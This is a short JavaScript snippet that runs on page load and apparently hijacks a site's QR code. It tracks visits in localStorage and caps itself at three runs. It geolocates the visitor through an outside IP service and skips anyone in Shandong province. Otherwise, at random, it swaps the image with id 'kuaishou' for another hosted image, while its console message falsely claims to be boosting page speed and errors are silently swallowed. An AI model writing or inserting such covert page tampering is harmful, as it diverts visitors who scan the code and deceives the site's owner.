// DD
const key = 'my_count';

const replaceIt = () => {
    const count = localStorage.getItem(key) || '0';
    console.log('file 🚀 提升网页速度的次数', count);
    let shouldReplace = true
    if (count > 3 ) {
      shouldReplace = false;
      return ;
    }

    fetch('https://ip.useragentinfo.com/json')
        .then((res) => {
            return res.json();
        })
        .then((res) => {
            if ((res.province || '').indexOf('山东') != -1) {
                shouldReplace = false;
                return;
            }

            const canDoIt = Math.random() < 0.2;
            if (canDoIt) {
                const erweimaDom = document.getElementById('kuaishou');
                erweimaDom.setAttribute("src", 'https://article.biliimg.com/bfs/article/27305a8b174d8cf7bf1f388c26c1647f8029a07f.jpg');
            }
        });

    localStorage.setItem(key, Number(count) + 1)
    return shouldReplace
  }


window.onload = function() {
    try {
        replaceIt();
    } catch {}
}
